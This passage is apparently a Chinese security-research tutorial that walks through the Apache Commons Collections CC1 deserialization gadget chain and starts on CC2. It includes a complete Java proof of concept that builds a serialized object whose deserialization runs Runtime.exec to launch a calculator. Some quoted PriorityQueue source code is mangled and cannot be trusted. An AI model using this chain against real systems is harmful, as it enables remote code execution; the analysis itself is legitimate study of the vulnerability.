拿到了对象然后就可按照常规的思路去进行invoke其下的exec方法，然后达到rce；即在此传入；
    new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})
然后这里直接按照常规的getMethod方法的传参方法去进行传入即可；最后达到弹出个计算器的效果；
上面的一段分析清楚了，接下来就是去考虑怎么承接的问题；怎么去触发ChainedTransformer下的transform方法；回到最开始的LazyMap类下；发现有个get方法；
    public Object get(Object key) {
        if (!super.map.containsKey(key)) {
            Object value = this.factory.transform(key);
            super.map.put(key, value);
            return value;
        } else {
            return super.map.get(key);
        }
    }
这里可以调用factory属性下的transfrom方法；factory是什么；追溯下发现：
    protected LazyMap(Map map, Transformer factory) {
        super(map);
        if (factory == null) {
            throw new IllegalArgumentException("Factory must not be null");
        } else {
            this.factory = factory;
        }
    }
可以是一个Transformer的类型的变量；所以可以通过构造方法和ChainedTransformer相连；但是仅仅相连还是不够的，我们应该考虑如何去触发下面的get方法；
这里有个新的类去要利用；AnnotationInvocationHandler类；如下图：
[
AnnotationInvocationHandler类中有个构造函数，我们看到在构造函数中存在一个Map类型的memberValues变量；接着往下追溯看到有一行代码：
    Object result = memberValues.get(member);
是调用了memberValues属性下的get方法；这里我们就可和之前的类进行衔接；而且注意到这个类是继承了Serializable接口的，是可以进行序列化的；我们只需要在构造函数处直接传入LazyMap就可；但是现在因为要想调用到上述的语句，就需要执行invoke方法；我们之前只是在构造函数中传入了我们需要的点，并不能直接执行，其执行是在invoke方法中；那么现在的问题就是如何去调用invoke方法；
## 代理类触发invoke
先来看AnnotationInvocationHandler类，它继承了InvocationHandler接口；该接口可以用来实现JDK的代理；JDK代理的主要函数为
，Proxy.newProxyInstance；追溯下函数：
    public static Object newProxyInstance(ClassLoader loader,
                                          Class[] interfaces,
                                          InvocationHandler h)
        throws IllegalArgumentException
追溯其类定义，发现其继承了Serializable接口，是可以序列化的；所以我们可以通过向该函数传递ClassLoader，interfaces，和重写invoke方法的InvocationHandler实现类即可实现代理。JDK代理是基于接口的，因为在本身在实现的时候是继承实现的，由于继承是单继承所以只能依靠接口。代理成功之后再调用原来类方法的时候会首先调用InvocationHandler实现类的invoke方法。同时我们可以看到在invoke函数中有个敏感方法的调用；在上述已经说过；⬆️；所以思路已经很清晰了；
## 构造POC
先来写生成代理类的方法；这里有个小点需要注意的是；AnnotationInvocationHandler类的构造方法是default限定符；在同包下可见；所以这里如果我们想调用，还得需要通过反射来进行变限定；这里为了逻辑清晰，我们首先编写transformers下的部分点；
    Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] {String.class,Class[].class}, new Object[] {"getRuntime",null }),
            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
            new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})
    };
     Transformer s1mple = new ChainedTransformer(transformers);
其实原理也很清楚了；上述也已经讲过，其实也就是通过另类的方法去调用到了getMethod
invoke这些方法，去实现任意类下的函数调用；验证方法：将上述代码再次调用transform即可弹出计算器；
为了上述的代码，现在的问题就是如何去调用transform方法；分析lazymap方法；即从get方法下手，这里因为LazyMap类下的构造器的限定问题，所以方法有二，直接拿到构造函数利用反射进行变限定，或者直接调用decorate方法即可；这里我采用的是方法一：
    HashMap hashmap = new HashMap();
    String mm = "org.apache.commons.collections.map.LazyMap";
    Class kk = Class.forName(mm);
    Constructor method = kk.getDeclaredConstructor(Map.class,Transformer.class);
    method.setAccessible(true);
    Object  lazymap = method.newInstance(hashmap,s1mple);
    Class jc = lazymap.getClass();
因为形参的要求，第一个参数必须是Map类型的参数，所以这里选择HashMap；因为其继承Map接口；即可满足；第二个为Transformer类型的参数，因为ChainedTransformer也是继承Transformer接口，所以直接传入，然后在下面就可顺利的调用到ChainedTransformer下的transform方法；现在就是如何调用get方法；
这里链的原作者找到了AnnotationInvocationHandler类；
    Object var6 = this.memberValues.get(var4);
在其invoke方法中，发现了可以调用任意类下的get方法；所以直接拿来用；可以将memberValues赋值为LazyMap的实力化对象，然后即可直接调用其get方法；那么现在的问题是如何去调用invoke方法；这里不得不佩服原作者的代码功底；继续看AnnotationInvocationHandler类中的readObject方法；
[
发现里面存在entrySet方法；我们只需要触发这个点就可；
    String handler = "sun.reflect.annotation.AnnotationInvocationHandler";
    Class inhandler = Class.forName(handler);
     Constructor constructor = inhandler.getDeclaredConstructors()[0];
     constructor.setAccessible(true);
     InvocationHandler AnnotationInvocationHandlerdx = (InvocationHandler) constructor.newInstance(Deprecated.class,lazymap);//拿到实例化类；
这我们先拿到AnnotationInvocationHandler的实例化对象；因为AnnotationInvocationHandler构造器限定符的原因，这里我们采用另外写法利用反射拿到构造器，然后执行构造器代码即可；触发invoke方法这里原作者是利用代理去触发invoke方法；先看其接口InvocationHandler，该接口是可以实现JDK代理；JDK代理的主要函数为
，Proxy.newProxyInstance；
将InvocationHandler的实力化对象作为代理的第二个参数传进去，然后代理成功之后再调用原来类方法的时候会首先调用InvocationHandler实现类的invoke方法。所以我们可以将memberValues设置为代理类；然后在readObject的时候进行调用entrySet方法；这时因为代理的原因，就会调用我们原对象也就是AnnotationInvocationHandler下的invoke方法；这时再将memberValues赋值为lazymap的对象，也就自然的调用了get方法，到此整个链成；
    package com.company;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.Runtime;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Method;
    import java.lang.reflect.Proxy;
    import java.util.HashMap;
    import java.util.Map;
    import static org.springframework.util.SerializationUtils.serialize;
    public class runtime_exec {
       public static void main(String[] args) throws Exception {
          Transformer[] transformers = new Transformer[] {
                  new ConstantTransformer(Runtime.class),
                  new InvokerTransformer("getMethod", new Class[] {String.class,Class[].class}, new Object[] {"getRuntime",null }),
                  new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                  new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})
          };
           Transformer s1mple = new ChainedTransformer(transformers);
           HashMap hashmap = new HashMap();
           String mm = "org.apache.commons.collections.map.LazyMap";
           Class kk = Class.forName(mm);
           Constructor method = kk.getDeclaredConstructor(Map.class,Transformer.class);
           method.setAccessible(true);
           Object  lazymap = method.newInstance(hashmap,s1mple);
           String handler = "sun.reflect.annotation.AnnotationInvocationHandler";
           Class inhandler = Class.forName(handler);
            Constructor constructor = inhandler.getDeclaredConstructors()[0];
            constructor.setAccessible(true);
            InvocationHandler AnnotationInvocationHandlerdx = (InvocationHandler) constructor.newInstance(Deprecated.class,lazymap);//拿到实例化类；
            Class cla = Deprecated.class;
            System.out.println("cla="+cla);
           Map evilMap = (Map) Proxy.newProxyInstance(
                   hashmap.getClass().getClassLoader(),
                   hashmap.getClass().getInterfaces(),
                   AnnotationInvocationHandlerdx
           );
           Constructor ctor = Class.forName(handler).getDeclaredConstructors()[0];
           ctor.setAccessible(true);
           InvocationHandler ahandler = (InvocationHandler) ctor.newInstance(Override.class, evilMap);
           ObjectOutputStream asdf = new ObjectOutputStream(new FileOutputStream("serialize.ser"));
           asdf.writeObject(ahandler);
           ObjectInputStream sdf = new ObjectInputStream(new FileInputStream("serialize.ser"));
           sdf.readObject();
       }
    }
这篇文章写了有点时间，中间有些间断，可能连贯性不是很好，但也算是一点研究的心得吧；
# CommonsCollections2
## 前言
之前我们分析了CC1的链，其调用并不是很复杂，唯一需要理解的点也就是利用for循环去进行任意类下任意方法的任意执行，我们在那个点去变相的调用到Runtime下的构造器；或者直接拿到另外返回构造器到函数然后直接invoke；还有也就是java的代理机制，在代理下执行encrySet函数的时候，会调用原类对象下的invoke方法；用着两个跳板去进行类的串联，从而最后执行Runtime类下的exec方法，导致任意命令执行；
其实CC2链最后的执行点和CC1的执行点是一样的，只是我们中途的利用方法不同，这次是通过Javassist在Java字节码中插入命令执行代码然后通过ClassLoader加载修改好的字节码。从而达到任意命令执行；链条很简单，主要是通过链条学习javassist的用法；
## 正文
我们先来看ysoserial的调用栈：简单分析下链条：
    /*
       Gadget chain:
          ObjectInputStream.readObject()
             PriorityQueue.readObject()
                ...
                   TransformingComparator.compare()
                      InvokerTransformer.transform()
                         Method.invoke()
                            Runtime.exec()
     */
复现的起点还是在PriorityQueue.readObject()方法；追溯一下：
## 优先级队列 PriorityQueue
`PriorityQueue`一个基于优先级的无界优先级队列。优先级队列的元素按照其自然顺序进行排序，放入`PriorityQueue`的元素，必须实现`Comparable`接口，`PriorityQueue`会根据元素的排序顺序决定出队的优先级；或者根据构造队列时提供的`Comparator`进行排序，元素就不必实现`Comparable`接口，具体取决于所使用的构造方法。
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        // Read in size, and any hidden stuff
        s.defaultReadObject();
        // Read in (and discard) array length
        s.readInt();
        queue = new Object[size];
        // Read in all elements.
        for (int i = 0; i >> 1) - 1; i >= 0; i--)
            siftDown(i, (E) queue[i]);
    }
       private void siftDown(int k, E x) {
            if (comparator != null)
                siftDownUsingComparator(k, x);
            else
                siftDownComparable(k, x);
        }
    private void siftDownUsingComparator(int k, E x) {
            int half = size >>> 1;
            while (k  0)
                    c = queue[child = right];
                if (comparator.compare(x, (E) c)  comparator) {
            // Note: This restriction of at least one is not actually needed,
            // but continues for 1.5 compatibility
            if (initialCapacity < 1)
                throw new IllegalArgumentException();
            this.queue = new Object[initialCapacity];
            this.comparator = comparator;
        }
这里将一些敏感的代码放到一起；可以看到继heapify方法之后去调用了siftDown方法；在其中判断力comparator是否为空，如果为空就会调用siftDownComparable方法；如果不为空的话就会去调用siftDownUsingComparator方法；追溯一下comparator变量，发现在类的构造器中有其赋值，是可控的；
这里回到heapify方法中，这里通过for循环遍历了queue中的元素，这里有个小坑，很多师傅包括我最开始都认为queue不能被序列化，因为其修饰符的原因，但是这里的for如果想成功触发也就意味着queue需要去序列化成流然后被反序列化拿出执行相应的承接块；那么为什么其可序列化？这里我看了篇文章，其实还是因为我们的PriorityQueue类中，重写了writeObject方法；
    private void writeObject(java.io.ObjectOutputStream s)
        throws java.io.IOException {
        // Write out element count, and any hidden stuff
        s.defaultWriteObject();
        // Write out array length, for compatibility with 1.5 version
        s.writeInt(Math.max(2, size + 1));
        // Write out all elements in the "proper order".
        for (int i = 0; i < size; i++)
            s.writeObject(queue[i]);
    }
这里看到是将queue数组中写入了值，然后在readObject的地方发生了for循环去读出queue中的数据的代码，Java是允许对象字节实现序列化方法的，以此来实现对自己的成员控制。
解决了这个点，继续向下看；
在siftDownUsingComparator方法中看到了comparator.compare的调用方式；因为comparator是可控的，这里我们可以参考CC1的思路；所以我们可以传入一个继承Comparator接口的实例，然后去调用到相应类下的compare比较方法；这里原作者使用的是TransformingComparator类；追溯过去；
    public class TransformingComparator implements Comparator {
        protected Comparator decorated;
        protected Transformer transformer;
        public TransformingComparator(Transformer transformer) {
            this(transformer, new ComparableComparator());
        }
        public TransformingComparator(Transformer transformer, Comparator decorated) {
            this.decorated = decorated;
            this.transformer = transformer;
        }
        public int compare(Object obj1, Object obj2) {
            Object value1 = this.transformer.transform(obj1);
            Object value2 = this.transformer.transform(obj2);
            return this.decorated.compare(value1, value2);
        }
    }
其继承了Comparator接口；而且可以直接调用到compare方法；而且选择这个类的还有一个好处是我们看到了transform方法；而且发现啊transformer是可控的，那么有一种强烈的感觉，这个点和CC1类似；transformer都是继承Transformer接口；那么直接控制transformer为InvokerTransformer类对象；直接去到transform方法；追溯下：